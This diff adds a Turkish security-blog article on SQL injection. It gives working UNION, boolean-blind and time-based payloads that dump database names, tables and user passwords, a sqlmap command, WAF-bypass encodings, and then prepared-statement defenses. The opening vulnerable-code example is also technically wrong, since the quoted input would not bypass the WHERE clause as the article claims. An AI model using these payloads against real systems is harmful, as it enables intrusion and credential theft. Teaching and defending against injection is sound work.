@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="SQL Injection saldırı tiplerini gerçek payload'larla inceliyoruz. Klasik, Blind ve Time-Based SQLi ile WAF bypass teknikleri ve tam koruma yöntemleri.">
+  <meta property="og:title" content="SQL Injection: Temelden İleri Seviye — 0xBlog">
+  <meta property="og:description" content="SQL Injection saldırı tiplerini gerçek payload'larla inceleyen kapsamlı teknik yazı.">
+  <meta property="og:type" content="article">
+  <title>SQL Injection: Temelden İleri Seviye Saldırı Analizi — 0xBlog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+</head>
+<body>
+
+  <!-- ── HEADER ── -->
+  <header class="site-header">
+    <nav class="nav-inner">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-bracket">[</span>0xBlog<span class="logo-bracket">]</span>
+        <span class="logo-cursor"></span>
+      </a>
+      <button class="nav-toggle" id="navToggle" aria-label="Menüyü aç/kapat">&#9776;</button>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="../index.html">Ana Sayfa</a></li>
+        <li><a href="../index.html#posts">Makaleler</a></li>
+        <li><a href="../index.html#about">Hakkında</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- ── MAIN ── -->
+  <main class="page-wrapper">
+
+    <!-- Article Hero -->
+    <header class="article-hero">
+      <nav class="article-breadcrumb" aria-label="Breadcrumb">
+        <a href="../index.html">Ana Sayfa</a>
+        <span class="sep">/</span>
+        <a href="../index.html#posts">Makaleler</a>
+        <span class="sep">/</span>
+        <span>SQL Injection</span>
+      </nav>
+
+      <h1>SQL Injection: Temelden İleri Seviye<br>Saldırı Analizi ve Önleme Teknikleri</h1>
+
+      <div class="article-meta-bar">
+        <span>5 Nisan 2026</span>
+        <span class="sep">|</span>
+        <span>Web Security</span>
+        <span class="sep">|</span>
+        <span>12 dk okuma</span>
+        <span class="sep">|</span>
+        <span style="color:var(--neon-dim)">0xBlog Yazarı</span>
+      </div>
+
+      <div class="article-tags">
+        <span class="tag active">SQL Injection</span>
+        <span class="tag active">OWASP</span>
+        <span class="tag active">Web App Security</span>
+        <span class="tag active">Penetration Testing</span>
+      </div>
+    </header>
+
+    <!-- Article Body -->
+    <article class="article-body">
+
+      <p>
+        SQL Injection (SQLi), bir saldırganın web uygulamasının veritabanı sorgularına kötü amaçlı SQL kodu enjekte etmesine olanak tanıyan kritik bir güvenlik açığıdır.
+        <strong>OWASP Top 10</strong>'da yıllardır ilk sıralarda yer alır ve doğru şekilde istismar edildiğinde
+        tüm veritabanının sızdırılmasından, kimlik doğrulama bypassına kadar geniş bir saldırı yüzeyi sunar.
+      </p>
+
+      <div class="warn-box">
+        <strong>&#9888; Yasal Uyarı:</strong> Bu yazıdaki teknikler yalnızca eğitim, CTF ve izin verilmiş pentest senaryoları için sunulmuştur.
+        İzinsiz sistemlere uygulanması yasalarca suçtur.
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Temel Mekanizma: Ne Zaman Oluşur?</h2>
+
+      <p>
+        SQLi, kullanıcı girdisinin sanitize edilmeden doğrudan bir SQL sorgusuna eklenmesiyle ortaya çıkar.
+        Aşağıdaki klasik PHP örneğini inceleyelim:
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">PHP — Vulnerable Code</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm">// KULLANICI GİRDİSİ: $_GET['id'] = "1 OR 1=1--"</span>
+<span class="va">$id</span>    = <span class="va">$_GET</span>[<span class="st">'id'</span>];
+<span class="va">$query</span> = <span class="st">"SELECT * FROM users WHERE id = '</span><span class="va">$id</span><span class="st">'"</span>;
+<span class="cm">// Oluşan sorgu:</span>
+<span class="cm">// SELECT * FROM users WHERE id = '1 OR 1=1--'</span>
+<span class="cm">// WHERE koşulu her zaman TRUE döner → tüm kayıtlar sızdırılır</span>
+<span class="va">$result</span> = <span class="fn">mysqli_query</span>(<span class="va">$conn</span>, <span class="va">$query</span>);</code></pre>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Saldırı Tipleri</h2>
+
+      <h3>1. Klasik (In-Band) SQLi</h3>
+      <p>
+        Saldırı sonuçlarının doğrudan HTTP yanıtında görülebildiği durumlardır.
+        <em>UNION-based</em> ve <em>Error-based</em> olarak ikiye ayrılır.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">SQL — UNION-Based Payload</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm">-- Adım 1: Kolon sayısını belirle</span>
+<span class="kw">ORDER BY</span> <span class="nu">1</span><span class="op">--</span>
+<span class="kw">ORDER BY</span> <span class="nu">2</span><span class="op">--</span>
+<span class="kw">ORDER BY</span> <span class="nu">3</span><span class="op">--</span>  <span class="cm">← hata verdiğinde 2 kolon olduğunu anlarız</span>
+
+<span class="cm">-- Adım 2: Veritabanı bilgisi çek</span>
+<span class="kw">UNION SELECT</span> <span class="fn">database</span>(), <span class="fn">version</span>()<span class="op">--</span>
+
+<span class="cm">-- Adım 3: Tablo isimlerini listele</span>
+<span class="kw">UNION SELECT</span> table_name, <span class="kw">NULL</span>
+<span class="kw">FROM</span> information_schema.tables
+<span class="kw">WHERE</span> table_schema=<span class="fn">database</span>()<span class="op">--</span>
+
+<span class="cm">-- Adım 4: Kullanıcıları dök</span>
+<span class="kw">UNION SELECT</span> username, password <span class="kw">FROM</span> users<span class="op">--</span></code></pre>
+      </div>
+
+      <h3>2. Blind (Kör) SQLi</h3>
+      <p>
+        Sorgu sonucu HTTP yanıtında görünmez; ancak uygulamanın farklı davranışları (TRUE/FALSE)
+        gözlemlerek veri çıkarılabilir. <em>Boolean-based</em> alt tipi bu yöntemi kullanır.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">SQL — Boolean-Based Blind</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm">-- Veritabanı adının ilk harfi 'm' mi?</span>
+<span class="kw">AND</span> <span class="fn">SUBSTRING</span>(<span class="fn">database</span>(),<span class="nu">1</span>,<span class="nu">1</span>)=<span class="st">'m'</span><span class="op">--</span>
+<span class="cm">-- Sayfa yüklendiyse → TRUE (ilk harf 'm')</span>
+<span class="cm">-- Yüklenmediyse  → FALSE</span>
+
+<span class="cm">-- sqlmap ile otomatize etmek:</span>
+<span class="at">sqlmap</span> -u <span class="st">"https://target.com/page?id=1"</span> \
+  --dbs --batch --level=<span class="nu">3</span> --risk=<span class="nu">2</span></code></pre>
+      </div>
+
+      <h3>3. Time-Based Blind SQLi</h3>
+      <p>
+        Uygulama hiçbir fark yaratmasa bile <strong>SLEEP()</strong> fonksiyonu ile
+        yanıt süresi ölçülerek veri doğrulanabilir.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">SQL — Time-Based Blind (MySQL)</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm">-- Yanıt 5 saniye gecikirse koşul TRUE demektir</span>
+<span class="kw">AND</span> <span class="fn">IF</span>(<span class="fn">SUBSTRING</span>(<span class="fn">database</span>(),<span class="nu">1</span>,<span class="nu">1</span>)=<span class="st">'m'</span>, <span class="fn">SLEEP</span>(<span class="nu">5</span>), <span class="nu">0</span>)<span class="op">--</span>
+
+<span class="cm">-- Microsoft SQL Server karşılığı:</span>
+<span class="kw">IF</span> (<span class="fn">SUBSTRING</span>(<span class="fn">db_name</span>(),<span class="nu">1</span>,<span class="nu">1</span>)=<span class="st">'m'</span>) <span class="kw">WAITFOR DELAY</span> <span class="st">'0:0:5'</span><span class="op">--</span></code></pre>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Ekran Görüntüsü: sqlmap Çıktısı</h2>
+
+      <div class="screenshot-wrapper">
+        <div class="screenshot-bar">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="screenshot-url">terminal — sqlmap --dbs çıktısı</span>
+        </div>
+        <!-- Gerçek ekran görüntüsü için: src="../assets/sqlmap-output.png" -->
+        <div class="img-placeholder">
+          <span class="icon">&#128247;</span>
+          <span>assets/sqlmap-output.png</span>
+          <small style="opacity:.5;font-size:.7rem">Ekran görüntüsünü buraya yerleştirin</small>
+        </div>
+        <p class="screenshot-caption">
+          sqlmap aracının hedef sistemdeki veritabanı listesini başarıyla çektiği terminal çıktısı.
+        </p>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>WAF Bypass Teknikleri</h2>
+
+      <p>
+        Web Application Firewall (WAF) çözümleri, bilinen SQLi imzalarını engellemeye çalışır.
+        Aşağıdaki teknikler bu filtreleri aşmak için kullanılır:
+      </p>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Teknik</th>
+            <th>Örnek</th>
+            <th>Açıklama</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Case Variation</td>
+            <td><code>SeLeCt</code></td>
+            <td>Büyük/küçük harf karıştırma</td>
+          </tr>
+          <tr>
+            <td>URL Encoding</td>
+            <td><code>%55NION</code></td>
+            <td>URL encode ile maskeleme</td>
+          </tr>
+          <tr>
+            <td>Comment Injection</td>
+            <td><code>UN/**/ION</code></td>
+            <td>SQL yorumu ile kelime bölme</td>
+          </tr>
+          <tr>
+            <td>Double Encoding</td>
+            <td><code>%2553ELECT</code></td>
+            <td>Çift katmanlı URL encode</td>
+          </tr>
+          <tr>
+            <td>Whitespace Bypass</td>
+            <td><code>SELECT%09FROM</code></td>
+            <td>Tab (0x09) ile boşluk yerine geçme</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="info-box">
+        <strong>&#9432; Not:</strong> Modern WAF'lar ML tabanlı analiz kullandığından bu teknikler her zaman geçerli olmayabilir.
+        Gerçek pentestlerde kombinasyon yaklaşımları tercih edilmelidir.
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Tam Koruma: Doğru Çözüm Yöntemi</h2>
+
+      <p>
+        SQL Injection'a karşı tek gerçek çözüm <strong>Prepared Statements (Parametrik Sorgular)</strong> kullanmaktır.
+        Input sanitizasyonu ikincil bir önlem olarak eklenebilir, ancak birincil savunma olmamalıdır.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span>
+            <span class="dot-yellow"></span>
+            <span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">PHP — Güvenli Kod (PDO)</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm">// ✓ DOĞRU: Prepared Statement ile PDO</span>
+<span class="va">$stmt</span> = <span class="va">$pdo</span>-><span class="fn">prepare</span>(<span class="st">"SELECT * FROM users WHERE id = :id"</span>);
+<span class="va">$stmt</span>-><span class="fn">bindParam</span>(<span class="st">':id'</span>, <span class="va">$_GET</span>[<span class="st">'id'</span>], PDO::PARAM_INT);
+<span class="va">$stmt</span>-><span class="fn">execute</span>();
+<span class="va">$user</span> = <span class="va">$stmt</span>-><span class="fn">fetch</span>();
+
+<span class="cm">// ✓ Python örneği (psycopg2 / PostgreSQL)</span>
+cursor.<span class="fn">execute</span>(
+    <span class="st">"SELECT * FROM users WHERE username = %s AND password = %s"</span>,
+    (username, password)  <span class="cm"># parametreler ayrı geçer</span>
+)
+
+<span class="cm">// ✓ Node.js örneği (mysql2)</span>
+<span class="kw">const</span> <span class="va">[rows]</span> = <span class="kw">await</span> connection.<span class="fn">execute</span>(
+    <span class="st">'SELECT * FROM users WHERE id = ?'</span>,
+    [userId]  <span class="cm">// ? yerine güvenle bağlanır</span>
+);</code></pre>
+      </div>
+
+      <h3>Ek Savunma Katmanları</h3>
+      <ul>
+        <li><strong>En Az Yetki İlkesi:</strong> Veritabanı kullanıcısına yalnızca gereken izinler verilmeli (SELECT-only vs. tam admin)</li>
+        <li><strong>Web Application Firewall:</strong> ModSecurity, AWS WAF gibi çözümler ikincil filtre sağlar</li>
+        <li><strong>Hata Mesajlarını Gizleme:</strong> Üretimde detaylı SQL hataları kapatılmalı</li>
+        <li><strong>ORM Kullanımı:</strong> SQLAlchemy, Hibernate gibi ORM'ler varsayılan olarak parametrik sorgu kullanır</li>
+        <li><strong>Düzenli DAST Taraması:</strong> sqlmap, OWASP ZAP ile periyodik otomasyon testleri</li>
+      </ul>
+
+      <div class="danger-box">
+        <strong>&#128680; Kritik:</strong> Blacklist tabanlı filtreleme (örn. SELECT kelimesini silmek) hiçbir zaman yeterli değildir.
+        Saldırganlar her zaman encoding veya obfuscation ile bunu aşabilir.
+        <em>Her zaman Prepared Statements kullanın.</em>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Kaynaklar &amp; İleri Okuma</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener">OWASP — SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger Web Security Academy — SQL Injection Labs</a></li>
+        <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap — Otomatik SQLi Aracı (GitHub)</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP SQL Injection Prevention Cheat Sheet</a></li>
+      </ul>
+
+      <!-- Article Footer -->
+      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;">
+        <a href="../index.html" class="read-more">&larr; Tüm Makaleler</a>
+        <span style="font-size:.78rem;color:var(--text-muted)">
+          Son güncelleme: 5 Nisan 2026
+        </span>
+      </div>
+
+    </article>
+  </main>
+
+  <!-- ── FOOTER ── -->
+  <footer class="site-footer">
+    <span class="footer-symbol">_</span>
+    &copy; <span id="year"></span> 0xBlog &mdash; Tüm içerikler eğitim amaçlıdır.
+  </footer>
+
+  <!-- ── JS ── -->
+  <script>
+    /* Yıl */
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    /* Nav toggle */
+    document.getElementById('navToggle').addEventListener('click', () => {
+      document.getElementById('navLinks').classList.toggle('open');
+    });
+
+    /* Kod kopyalama */
+    function copyCode(btn) {
+      const pre = btn.closest('.code-block').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Kopyalandı!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = 'Kopyala';
+          btn.classList.remove('copied');
+        }, 2000);
+      }).catch(() => {
+        /* Clipboard API yoksa sessizce devam et */
+      });
+    }
+  </script>
+</body>
+</html>
